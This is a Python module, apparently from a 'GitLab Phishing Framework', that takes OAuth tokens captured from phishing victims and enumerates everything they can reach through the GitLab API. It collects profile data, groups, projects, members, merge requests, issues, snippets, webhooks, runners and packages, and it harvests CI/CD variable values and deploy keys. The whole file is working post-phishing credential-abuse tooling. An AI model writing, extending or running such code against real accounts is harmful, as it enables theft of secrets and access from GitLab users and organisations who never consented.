"""
Resource Enumerator module for the GitLab Phishing Framework.
Enumerates accessible resources after token capture.
"""

import logging
import requests
from typing import Dict, List, Optional, Any

from ..interfaces import ResourceEnumeratorInterface, OperationResult
from ..models import Config
from ..exceptions import GitLabAPIError, NetworkError, EnumerationError



logger = logging.getLogger(__name__)


class ResourceEnumerator(ResourceEnumeratorInterface):
    """
    Resource Enumerator module for discovering accessible GitLab resources.
    
    This module enumerates:
    - User information
    - Accessible projects
    - CI/CD variables (where permissions allow)
    """
    
    def __init__(self, config: Config):
        """
        Initialize the Resource Enumerator.
        
        Args:
            config: Framework configuration
        """
        self.config = config
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'GitLab-Security-Assessment/1.0'
        })
        # Disable SSL warnings if verification is disabled
        if not config.verify_ssl:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        logger.info("Resource Enumerator initialized")
    
    def enumerate_all(self, operation_id: int, victim_id: int, 
                     access_token: str, base_url: str) -> OperationResult:
        """
        Enumerate all accessible resources for a victim.
        
        This orchestrates the complete enumeration process with graceful degradation:
        1. Enumerate user information
        2. Enumerate accessible projects
        3. Enumerate CI/CD variables for each project
        
        The enumeration continues even if individual steps fail, collecting
        as much information as possible.
        
        Args:
            operation_id: ID of the operation
            victim_id: ID of the victim
            access_token: OAuth access token
            base_url: GitLab instance base URL
            
        Returns:
            OperationResult with enumeration results (partial or complete)
        """
        logger.info(f"Starting enumeration for victim {victim_id} in operation {operation_id}")
        
        results = {
            'user_info': None,
            'projects': [],
            'groups': [],
            'ci_variables': {},
            'group_members': {},
            'project_members': {},
            'merge_requests': {},
            'issues': {},
            'snippets': [],
            'deploy_keys': {},
            'webhooks': {},
            'protected_branches': {},
            'runners': {},
            'container_registries': {},
            'packages': {},
            'errors': []
        }
        
        # Step 1: Enumerate user information (with graceful degradation)
        logger.debug(f"Enumerating user info for victim {victim_id}")
        try:
            user_info = self.enumerate_user(access_token, base_url)
            results['user_info'] = user_info
            logger.info(f"User enumeration successful: {user_info.get('username', 'unknown')}")
        except Exception as e:
            error_msg = f"User enumeration failed: {str(e)}"
            logger.warning(f"{error_msg} - continuing with other enumeration")
            results['errors'].append(error_msg)
        
        # Step 2: Enumerate groups (with graceful degradation)
        logger.debug(f"Enumerating groups for victim {victim_id}")
        try:
            groups = self.enumerate_groups(access_token, base_url)
            results['groups'] = groups
            logger.info(f"Found {len(groups)} accessible groups")
            
            # Enumerate group members for each group
            for group in groups:
                group_id = group.get('id')
                if group_id:
                    try:
                        members = self.enumerate_group_members(access_token, base_url, group_id)
                        if members:
                            results['group_members'][group_id] = members
                            logger.debug(f"Found {len(members)} members in group {group_id}")
                    except Exception as e:
                        logger.debug(f"Failed to enumerate members for group {group_id}: {str(e)}")
        except Exception as e:
            error_msg = f"Group enumeration failed: {str(e)}"
            logger.warning(f"{error_msg} - continuing with other enumeration")
            results['errors'].append(error_msg)
        
        # Step 3: Enumerate projects (with graceful degradation)
        logger.debug(f"Enumerating projects for victim {victim_id}")
        try:
            projects = self.enumerate_projects(access_token, base_url)
            results['projects'] = projects
            logger.info(f"Found {len(projects)} accessible projects")
        except Exception as e:
            error_msg = f"Project enumeration failed: {str(e)}"
            logger.warning(f"{error_msg} - continuing with other enumeration")
            results['errors'].append(error_msg)
        
        # Step 4: Enumerate snippets (with graceful degradation)
        logger.debug(f"Enumerating snippets for victim {victim_id}")
        try:
            snippets = self.enumerate_snippets(access_token, base_url)
            results['snippets'] = snippets
            logger.info(f"Found {len(snippets)} snippets")
        except Exception as e:
            error_msg = f"Snippet enumeration failed: {str(e)}"
            logger.warning(f"{error_msg} - continuing with other enumeration")
            results['errors'].append(error_msg)
        
        # Step 5: Enumerate project-specific resources for each project
        if results['projects']:
            logger.debug(f"Enumerating project-specific resources for {len(results['projects'])} projects")
            for project in results['projects']:
                project_id = project.get('id')
                project_name = project.get('name', 'unknown')
                if not project_id:
                    continue
                
                # CI/CD variables
                try:
                    variables = self.enumerate_ci_variables(access_token, base_url, project_id)
                    if variables:
                        results['ci_variables'][project_id] = variables
                        logger.debug(f"Found {len(variables)} CI/CD variables in project {project_id}")
                except GitLabAPIError as e:
                    if e.is_forbidden():
                        logger.debug(f"Insufficient permissions for CI/CD vars in project {project_name}")
                    else:
                        logger.debug(f"CI/CD enumeration failed for project {project_name}: {e.message}")
                except Exception as e:
                    logger.debug(f"Unexpected error enumerating CI/CD for project {project_name}: {str(e)}")
                
                # Project members
                try:
                    members = self.enumerate_project_members(access_token, base_url, project_id)
                    if members:
                        results['project_members'][project_id] = members
                        logger.debug(f"Found {len(members)} members in project {project_id}")
                except Exception as e:
                    logger.debug(f"Failed to enumerate members for project {project_name}: {str(e)}")
                
                # Merge requests
                try:
                    mrs = self.enumerate_merge_requests(access_token, base_url, project_id)
                    if mrs:
                        results['merge_requests'][project_id] = mrs
                        logger.debug(f"Found {len(mrs)} merge requests in project {project_id}")
                except Exception as e:
                    logger.debug(f"Failed to enumerate merge requests for project {project_name}: {str(e)}")
                
                # Issues
                try:
                    issues = self.enumerate_issues(access_token, base_url, project_id)
                    if issues:
                        results['issues'][project_id] = issues
                        logger.debug(f"Found {len(issues)} issues in project {project_id}")
                except Exception as e:
                    logger.debug(f"Failed to enumerate issues for project {project_name}: {str(e)}")
                
                # Deploy keys
                try:
                    keys = self.enumerate_deploy_keys(access_token, base_url, project_id)
                    if keys:
                        results['deploy_keys'][project_id] = keys
                        logger.debug(f"Found {len(keys)} deploy keys in project {project_id}")
                except Exception as e:
                    logger.debug(f"Failed to enumerate deploy keys for project {project_name}: {str(e)}")
                
                # Webhooks
                try:
                    hooks = self.enumerate_webhooks(access_token, base_url, project_id)
                    if hooks:
                        results['webhooks'][project_id] = hooks
                        logger.debug(f"Found {len(hooks)} webhooks in project {project_id}")
                except Exception as e:
                    logger.debug(f"Failed to enumerate webhooks for project {project_name}: {str(e)}")
                
                # Protected branches
                try:
                    branches = self.enumerate_protected_branches(access_token, base_url, project_id)
                    if branches:
                        results['protected_branches'][project_id] = branches
                        logger.debug(f"Found {len(branches)} protected branches in project {project_id}")
                except Exception as e:
                    logger.debug(f"Failed to enumerate protected branches for project {project_name}: {str(e)}")
                
                # Runners
                try:
                    runners = self.enumerate_runners(access_token, base_url, project_id)
                    if runners:
                        results['runners'][project_id] = runners
                        logger.debug(f"Found {len(runners)} runners in project {project_id}")
                except Exception as e:
                    logger.debug(f"Failed to enumerate runners for project {project_name}: {str(e)}")
                
                # Container registries
                try:
                    registries = self.enumerate_container_registries(access_token, base_url, project_id)
                    if registries:
                        results['container_registries'][project_id] = registries
                        logger.debug(f"Found {len(registries)} container registries in project {project_id}")
                except Exception as e:
                    logger.debug(f"Failed to enumerate container registries for project {project_name}: {str(e)}")
                
                # Packages
                try:
                    packages = self.enumerate_packages(access_token, base_url, project_id)
                    if packages:
                        results['packages'][project_id] = packages
                        logger.debug(f"Found {len(packages)} packages in project {project_id}")
                except Exception as e:
                    logger.debug(f"Failed to enumerate packages for project {project_name}: {str(e)}")
        
        # Determine success based on whether we got any useful data
        success = results['user_info'] is not None or len(results['projects']) > 0
        
        if success:
            logger.info(f"Enumeration completed for victim {victim_id}: "
                      f"{len(results['projects'])} projects, "
                      f"{len(results['ci_variables'])} projects with CI/CD vars, "
                      f"{len(results['errors'])} errors")
            return OperationResult(
                success=True,
                data=results,
                message="Enumeration completed successfully" if not results['errors'] 
                       else "Enumeration completed with some errors"
            )
        else:
            logger.warning(f"Enumeration completed with no data for victim {victim_id}")
            return OperationResult(
                success=False,
                data=results,
                error="No data could be enumerated",
                message="Enumeration completed but no resources were accessible"
            )
    
    def enumerate_user(self, access_token: str, base_url: str) -> Dict:
        """
        Enumerate user information.
        
        Makes a GET request to /api/v4/user to retrieve information
        about the authenticated user.
        
        Args:
            access_token: OAuth access token
            base_url: GitLab instance base URL
            
        Returns:
            Dictionary with user information containing:
            - username: GitLab username
            - email: Email address
            - user_id: GitLab user ID
            - name: Full name
            - avatar_url: Avatar URL
            
        Raises:
            GitLabAPIError: If the API request fails
        """
        url = f"{base_url.rstrip('/')}/api/v4/user"
        headers = {
            'Authorization': f'Bearer {access_token}'
        }
        
        logger.debug(f"Requesting user info from {url}")
        
        try:
            response = self.session.get(
                url,
                headers=headers,
                timeout=self.config.api_timeout,
                verify=self.config.verify_ssl
            )
            
            if response.status_code == 200:
                data = response.json()
                user_info = {
                    'username': data.get('username'),
                    'email': data.get('email'),
                    'user_id': data.get('id'),
                    'name': data.get('name'),
                    'avatar_url': data.get('avatar_url'),
                    'state': data.get('state'),
                    'web_url': data.get('web_url'),
                    'created_at': data.get('created_at'),
                    'bio': data.get('bio'),
                    'location': data.get('location'),
                    'public_email': data.get('public_email'),
                    'organization': data.get('organization'),
                    'job_title': data.get('job_title'),
                    'is_admin': data.get('is_admin', False)
                }
                logger.debug(f"User info retrieved: {user_info['username']} (ID: {user_info['user_id']})")
                return user_info
            
            elif response.status_code == 401:
                raise GitLabAPIError(
                    "Unauthorized: Invalid or expired access token",
                    status_code=401,
                    response_data=response.json() if response.text else None
                )
            
            elif response.status_code == 403:
                raise GitLabAPIError(
                    "Forbidden: Insufficient permissions to access user information",
                    status_code=403,
                    response_data=response.json() if response.text else None
                )
            
            else:
                raise GitLabAPIError(
                    f"Failed to enumerate user: HTTP {response.status_code}",
                    status_code=response.status_code,
                    response_data=response.json() if response.text else None
                )
        
        except requests.exceptions.Timeout:
            raise GitLabAPIError("Request timeout while enumerating user")
        
        except requests.exceptions.ConnectionError:
            raise GitLabAPIError(f"Connection error: Cannot connect to {base_url}")
        
        except requests.exceptions.RequestException as e:
            raise GitLabAPIError(f"Request failed: {str(e)}")
    
    def enumerate_projects(self, access_token: str, base_url: str) -> List[Dict]:
        """
        Enumerate accessible projects.
        
        Makes a GET request to /api/v4/projects with membership=true
        to retrieve projects the user has access to.
        
        Args:
            access_token: OAuth access token
            base_url: GitLab instance base URL
            
        Returns:
            List of project dictionaries containing:
            - id: Project ID
            - name: Project name
            - path: Project path
            - visibility: Project visibility (public, internal, private)
            - namespace: Namespace information
            - description: Project description
            - web_url: Web URL to the project
            
        Raises:
            GitLabAPIError: If the API request fails
        """
        url = f"{base_url.rstrip('/')}/api/v4/projects"
        headers = {
            'Authorization': f'Bearer {access_token}'
        }
        params = {
            'membership': 'true',
            'simple': 'true',
            'per_page': 100  # Get up to 100 projects per page
        }
        
        logger.debug(f"Requesting projects from {url}")
        
        all_projects = []
        page = 1
        
        try:
            while True:
                params['page'] = page
                
                response = self.session.get(
                    url,
                    headers=headers,
                    params=params,
                    timeout=self.config.api_timeout,
                    verify=self.config.verify_ssl
                )
                
                if response.status_code == 200:
                    projects = response.json()
                    
                    if not projects:
                        # No more projects
                        break
                    
                    for project in projects:
                        project_info = {
                            'id': project.get('id'),
                            'name': project.get('name'),
                            'path': project.get('path'),
                            'path_with_namespace': project.get('path_with_namespace'),
                            'visibility': project.get('visibility'),
                            'namespace': project.get('namespace'),
                            'description': project.get('description'),
                            'web_url': project.get('web_url'),
                            'ssh_url_to_repo': project.get('ssh_url_to_repo'),
                            'http_url_to_repo': project.get('http_url_to_repo'),
                            'created_at': project.get('created_at'),
                            'last_activity_at': project.get('last_activity_at'),
                            'archived': project.get('archived', False),
                            'default_branch': project.get('default_branch')
                        }
                        all_projects.append(project_info)
                    
                    # Check if there are more pages
                    if 'x-next-page' not in response.headers or not response.headers['x-next-page']:
                        break
                    
                    page += 1
                
                elif response.status_code == 401:
                    raise GitLabAPIError(
                        "Unauthorized: Invalid or expired access token",
                        status_code=401,
                        response_data=response.json() if response.text else None
                    )
                
                elif response.status_code == 403:
                    raise GitLabAPIError(
                        "Forbidden: Insufficient permissions to list projects",
                        status_code=403,
                        response_data=response.json() if response.text else None
                    )
                
                else:
                    raise GitLabAPIError(
                        f"Failed to enumerate projects: HTTP {response.status_code}",
                        status_code=response.status_code,
                        response_data=response.json() if response.text else None
                    )
            
            logger.debug(f"Projects enumeration complete: {len(all_projects)} projects found")
            return all_projects
        
        except requests.exceptions.Timeout:
            raise GitLabAPIError("Request timeout while enumerating projects")
        
        except requests.exceptions.ConnectionError:
            raise GitLabAPIError(f"Connection error: Cannot connect to {base_url}")
        
        except requests.exceptions.RequestException as e:
            raise GitLabAPIError(f"Request failed: {str(e)}")
    
    def enumerate_ci_variables(self, access_token: str, base_url: str, 
                               project_id: int) -> List[Dict]:
        """
        Enumerate CI/CD variables for a project.
        
        Makes a GET request to /api/v4/projects/{project_id}/variables
        to retrieve CI/CD variables. This requires maintainer or owner
        permissions on the project.
        
        Args:
            access_token: OAuth access token
            base_url: GitLab instance base URL
            project_id: ID of the project
            
        Returns:
            List of CI/CD variable dictionaries containing:
            - key: Variable key
            - value: Variable value (if not masked)
            - masked: Whether the variable is masked
            - protected: Whether the variable is protected
            - variable_type: Type of variable (env_var or file)
            
        Raises:
            GitLabAPIError: If the API request fails
        """
        url = f"{base_url.rstrip('/')}/api/v4/projects/{project_id}/variables"
        headers = {
            'Authorization': f'Bearer {access_token}'
        }
        
        logger.debug(f"Requesting CI/CD variables from {url}")
        
        try:
            response = self.session.get(
                url,
                headers=headers,
                timeout=self.config.api_timeout,
                verify=self.config.verify_ssl
            )
            
            if response.status_code == 200:
                variables = response.json()
                
                variable_list = []
                for var in variables:
                    variable_info = {
                        'key': var.get('key'),
                        'value': var.get('value'),  # May be None if masked
                        'masked': var.get('masked', False),
                        'protected': var.get('protected', False),
                        'variable_type': var.get('variable_type', 'env_var'),
                        'environment_scope': var.get('environment_scope', '*')
                    }
                    variable_list.append(variable_info)
                
                logger.debug(f"CI/CD variables enumeration complete: {len(variable_list)} variables found")
                return variable_list
            
            elif response.status_code == 401:
                raise GitLabAPIError(
                    "Unauthorized: Invalid or expired access token",
                    status_code=401,
                    response_data=response.json() if response.text else None
                )
            
            elif response.status_code == 403:
                # This is expected for projects where user doesn't have maintainer access
                logger.debug(f"Insufficient permissions to access CI/CD variables for project {project_id}")
                raise GitLabAPIError(
                    "Forbidden: Insufficient permissions to access CI/CD variables",
                    status_code=403,
                    response_data=response.json() if response.text else None
                )
            
            elif response.status_code == 404:
                # Project not found or no variables
                logger.debug(f"No CI/CD variables found for project {project_id}")
                return []
            
            else:
                raise GitLabAPIError(
                    f"Failed to enumerate CI/CD variables: HTTP {response.status_code}",
                    status_code=response.status_code,
                    response_data=response.json() if response.text else None
                )
        
        except requests.exceptions.Timeout:
            raise GitLabAPIError("Request timeout while enumerating CI/CD variables")
        
        except requests.exceptions.ConnectionError:
            raise GitLabAPIError(f"Connection error: Cannot connect to {base_url}")
        
        except requests.exceptions.RequestException as e:
            raise GitLabAPIError(f"Request failed: {str(e)}")
    
    def enumerate_groups(self, access_token: str, base_url: str) -> List[Dict]:
        """Enumerate accessible groups."""
        url = f"{base_url.rstrip('/')}/api/v4/groups"
        headers = {'Authorization': f'Bearer {access_token}'}
        params = {'per_page': 100}
        
        logger.debug(f"Requesting groups from {url}")
        all_groups = []
        page = 1
        
        try:
            while True:
                params['page'] = page
                response = self.session.get(url, headers=headers, params=params, timeout=self.config.api_timeout, verify=self.config.verify_ssl)
                
                if response.status_code == 200:
                    groups = response.json()
                    if not groups:
                        break
                    
                    for group in groups:
                        group_info = {
                            'id': group.get('id'),
                            'name': group.get('name'),
                            'path': group.get('path'),
                            'full_path': group.get('full_path'),
                            'visibility': group.get('visibility'),
                            'description': group.get('description'),
                            'web_url': group.get('web_url')
                        }
                        all_groups.append(group_info)
                    
                    if 'x-next-page' not in response.headers or not response.headers['x-next-page']:
                        break
                    page += 1
                elif response.status_code in [401, 403]:
                    raise GitLabAPIError(f"Insufficient permissions: HTTP {response.status_code}", status_code=response.status_code)
                else:
                    raise GitLabAPIError(f"Failed to enumerate groups: HTTP {response.status_code}", status_code=response.status_code)
            
            logger.debug(f"Groups enumeration complete: {len(all_groups)} groups found")
            return all_groups
        except requests.exceptions.RequestException as e:
            raise GitLabAPIError(f"Request failed: {str(e)}")
    
    def enumerate_group_members(self, access_token: str, base_url: str, group_id: int) -> List[Dict]:
        """Enumerate members of a group."""
        url = f"{base_url.rstrip('/')}/api/v4/groups/{group_id}/members"
        headers = {'Authorization': f'Bearer {access_token}'}
        params = {'per_page': 100}
        
        try:
            response = self.session.get(url, headers=headers, params=params, timeout=self.config.api_timeout, verify=self.config.verify_ssl)
            if response.status_code == 200:
                members = response.json()
                return [{
                    'id': m.get('id'),
                    'username': m.get('username'),
                    'name': m.get('name'),
                    'access_level': m.get('access_level')
                } for m in members]
            elif response.status_code in [403, 404]:
                logger.debug(f"Cannot access group members for group {group_id}")
                return []
            else:
                raise GitLabAPIError(f"Failed to enumerate group members: HTTP {response.status_code}", status_code=response.status_code)
        except requests.exceptions.RequestException as e:
            raise GitLabAPIError(f"Request failed: {str(e)}")
    
    def enumerate_project_members(self, access_token: str, base_url: str, project_id: int) -> List[Dict]:
        """Enumerate members of a project."""
        url = f"{base_url.rstrip('/')}/api/v4/projects/{project_id}/members"
        headers = {'Authorization': f'Bearer {access_token}'}
        params = {'per_page': 100}
        
        try:
            response = self.session.get(url, headers=headers, params=params, timeout=self.config.api_timeout, verify=self.config.verify_ssl)
            if response.status_code == 200:
                members = response.json()
                return [{
                    'id': m.get('id'),
                    'username': m.get('username'),
                    'name': m.get('name'),
                    'access_level': m.get('access_level')
                } for m in members]
            elif response.status_code in [403, 404]:
                logger.debug(f"Cannot access project members for project {project_id}")
                return []
            else:
                raise GitLabAPIError(f"Failed to enumerate project members: HTTP {response.status_code}", status_code=response.status_code)
        except requests.exceptions.RequestException as e:
            raise GitLabAPIError(f"Request failed: {str(e)}")
    
    def enumerate_merge_requests(self, access_token: str, base_url: str, project_id: int) -> List[Dict]:
        """Enumerate merge requests for a project."""
        url = f"{base_url.rstrip('/')}/api/v4/projects/{project_id}/merge_requests"
        headers = {'Authorization': f'Bearer {access_token}'}
        params = {'per_page': 50, 'state': 'all'}
        
        try:
            response = self.session.get(url, headers=headers, params=params, timeout=self.config.api_timeout, verify=self.config.verify_ssl)
            if response.status_code == 200:
                mrs = response.json()
                return [{
                    'id': mr.get('id'),
                    'iid': mr.get('iid'),
                    'title': mr.get('title'),
                    'state': mr.get('state'),
                    'author': mr.get('author'),
                    'source_branch': mr.get('source_branch'),
                    'target_branch': mr.get('target_branch'),
                    'web_url': mr.get('web_url')
                } for mr in mrs]
            elif response.status_code in [403, 404]:
                logger.debug(f"Cannot access merge requests for project {project_id}")
                return []
            else:
                raise GitLabAPIError(f"Failed to enumerate merge requests: HTTP {response.status_code}", status_code=response.status_code)
        except requests.exceptions.RequestException as e:
            raise GitLabAPIError(f"Request failed: {str(e)}")
    
    def enumerate_issues(self, access_token: str, base_url: str, project_id: int) -> List[Dict]:
        """Enumerate issues for a project."""
        url = f"{base_url.rstrip('/')}/api/v4/projects/{project_id}/issues"
        headers = {'Authorization': f'Bearer {access_token}'}
        params = {'per_page': 50, 'state': 'all'}
        
        try:
            response = self.session.get(url, headers=headers, params=params, timeout=self.config.api_timeout, verify=self.config.verify_ssl)
            if response.status_code == 200:
                issues = response.json()
                return [{
                    'id': issue.get('id'),
                    'iid': issue.get('iid'),
                    'title': issue.get('title'),
                    'state': issue.get('state'),
                    'author': issue.get('author'),
                    'labels': issue.get('labels', []),
                    'web_url': issue.get('web_url')
                } for issue in issues]
            elif response.status_code in [403, 404]:
                logger.debug(f"Cannot access issues for project {project_id}")
                return []
            else:
                raise GitLabAPIError(f"Failed to enumerate issues: HTTP {response.status_code}", status_code=response.status_code)
        except requests.exceptions.RequestException as e:
            raise GitLabAPIError(f"Request failed: {str(e)}")
    
    def enumerate_snippets(self, access_token: str, base_url: str) -> List[Dict]:
        """Enumerate user snippets."""
        url = f"{base_url.rstrip('/')}/api/v4/snippets"
        headers = {'Authorization': f'Bearer {access_token}'}
        params = {'per_page': 100}
        
        try:
            response = self.session.get(url, headers=headers, params=params, timeout=self.config.api_timeout, verify=self.config.verify_ssl)
            if response.status_code == 200:
                snippets = response.json()
                return [{
                    'id': s.get('id'),
                    'title': s.get('title'),
                    'file_name': s.get('file_name'),
                    'visibility': s.get('visibility'),
                    'web_url': s.get('web_url')
                } for s in snippets]
            elif response.status_code in [403, 404]:
                logger.debug("Cannot access snippets")
                return []
            else:
                raise GitLabAPIError(f"Failed to enumerate snippets: HTTP {response.status_code}", status_code=response.status_code)
        except requests.exceptions.RequestException as e:
            raise GitLabAPIError(f"Request failed: {str(e)}")
    
    def enumerate_deploy_keys(self, access_token: str, base_url: str, project_id: int) -> List[Dict]:
        """Enumerate deploy keys for a project."""
        url = f"{base_url.rstrip('/')}/api/v4/projects/{project_id}/deploy_keys"
        headers = {'Authorization': f'Bearer {access_token}'}
        
        try:
            response = self.session.get(url, headers=headers, timeout=self.config.api_timeout, verify=self.config.verify_ssl)
            if response.status_code == 200:
                keys = response.json()
                return [{
                    'id': k.get('id'),
                    'title': k.get('title'),
                    'key': k.get('key'),
                    'can_push': k.get('can_push', False),
                    'created_at': k.get('created_at')
                } for k in keys]
            elif response.status_code in [403, 404]:
                logger.debug(f"Cannot access deploy keys for project {project_id}")
                return []
            else:
                raise GitLabAPIError(f"Failed to enumerate deploy keys: HTTP {response.status_code}", status_code=response.status_code)
        except requests.exceptions.RequestException as e:
            raise GitLabAPIError(f"Request failed: {str(e)}")
    
    def enumerate_webhooks(self, access_token: str, base_url: str, project_id: int) -> List[Dict]:
        """Enumerate webhooks for a project."""
        url = f"{base_url.rstrip('/')}/api/v4/projects/{project_id}/hooks"
        headers = {'Authorization': f'Bearer {access_token}'}
        
        try:
            response = self.session.get(url, headers=headers, timeout=self.config.api_timeout, verify=self.config.verify_ssl)
            if response.status_code == 200:
                hooks = response.json()
                return [{
                    'id': h.get('id'),
                    'url': h.get('url'),
                    'push_events': h.get('push_events', False),
                    'merge_requests_events': h.get('merge_requests_events', False),
                    'issues_events': h.get('issues_events', False)
                } for h in hooks]
            elif response.status_code in [403, 404]:
                logger.debug(f"Cannot access webhooks for project {project_id}")
                return []
            else:
                raise GitLabAPIError(f"Failed to enumerate webhooks: HTTP {response.status_code}", status_code=response.status_code)
        except requests.exceptions.RequestException as e:
            raise GitLabAPIError(f"Request failed: {str(e)}")
    
    def enumerate_protected_branches(self, access_token: str, base_url: str, project_id: int) -> List[Dict]:
        """Enumerate protected branches for a project."""
        url = f"{base_url.rstrip('/')}/api/v4/projects/{project_id}/protected_branches"
        headers = {'Authorization': f'Bearer {access_token}'}
        
        try:
            response = self.session.get(url, headers=headers, timeout=self.config.api_timeout, verify=self.config.verify_ssl)
            if response.status_code == 200:
                branches = response.json()
                return [{
                    'name': b.get('name'),
                    'push_access_levels': b.get('push_access_levels', []),
                    'merge_access_levels': b.get('merge_access_levels', []),
                    'allow_force_push': b.get('allow_force_push', False)
                } for b in branches]
            elif response.status_code in [403, 404]:
                logger.debug(f"Cannot access protected branches for project {project_id}")
                return []
            else:
                raise GitLabAPIError(f"Failed to enumerate protected branches: HTTP {response.status_code}", status_code=response.status_code)
        except requests.exceptions.RequestException as e:
            raise GitLabAPIError(f"Request failed: {str(e)}")
    
    def enumerate_runners(self, access_token: str, base_url: str, project_id: int) -> List[Dict]:
        """Enumerate runners for a project."""
        url = f"{base_url.rstrip('/')}/api/v4/projects/{project_id}/runners"
        headers = {'Authorization': f'Bearer {access_token}'}
        
        try:
            response = self.session.get(url, headers=headers, timeout=self.config.api_timeout, verify=self.config.verify_ssl)
            if response.status_code == 200:
                runners = response.json()
                return [{
                    'id': r.get('id'),
                    'description': r.get('description'),
                    'active': r.get('active', False),
                    'is_shared': r.get('is_shared', False),
                    'runner_type': r.get('runner_type')
                } for r in runners]
            elif response.status_code in [403, 404]:
                logger.debug(f"Cannot access runners for project {project_id}")
                return []
            else:
                raise GitLabAPIError(f"Failed to enumerate runners: HTTP {response.status_code}", status_code=response.status_code)
        except requests.exceptions.RequestException as e:
            raise GitLabAPIError(f"Request failed: {str(e)}")
    
    def enumerate_container_registries(self, access_token: str, base_url: str, project_id: int) -> List[Dict]:
        """Enumerate container registries for a project."""
        url = f"{base_url.rstrip('/')}/api/v4/projects/{project_id}/registry/repositories"
        headers = {'Authorization': f'Bearer {access_token}'}
        
        try:
            response = self.session.get(url, headers=headers, timeout=self.config.api_timeout, verify=self.config.verify_ssl)
            if response.status_code == 200:
                registries = response.json()
                return [{
                    'id': r.get('id'),
                    'name': r.get('name'),
                    'path': r.get('path'),
                    'location': r.get('location'),
                    'created_at': r.get('created_at')
                } for r in registries]
            elif response.status_code in [403, 404]:
                logger.debug(f"Cannot access container registries for project {project_id}")
                return []
            else:
                raise GitLabAPIError(f"Failed to enumerate container registries: HTTP {response.status_code}", status_code=response.status_code)
        except requests.exceptions.RequestException as e:
            raise GitLabAPIError(f"Request failed: {str(e)}")
    
    def enumerate_packages(self, access_token: str, base_url: str, project_id: int) -> List[Dict]:
        """Enumerate packages for a project."""
        url = f"{base_url.rstrip('/')}/api/v4/projects/{project_id}/packages"
        headers = {'Authorization': f'Bearer {access_token}'}
        
        try:
            response = self.session.get(url, headers=headers, timeout=self.config.api_timeout, verify=self.config.verify_ssl)
            if response.status_code == 200:
                packages = response.json()
                return [{
                    'id': p.get('id'),
                    'name': p.get('name'),
                    'version': p.get('version'),
                    'package_type': p.get('package_type'),
                    'created_at': p.get('created_at')
                } for p in packages]
            elif response.status_code in [403, 404]:
                logger.debug(f"Cannot access packages for project {project_id}")
                return []
            else:
                raise GitLabAPIError(f"Failed to enumerate packages: HTTP {response.status_code}", status_code=response.status_code)
        except requests.exceptions.RequestException as e:
            raise GitLabAPIError(f"Request failed: {str(e)}")
    
    def close(self):
        """Close the HTTP session."""
        self.session.close()
        logger.debug("Resource Enumerator session closed")
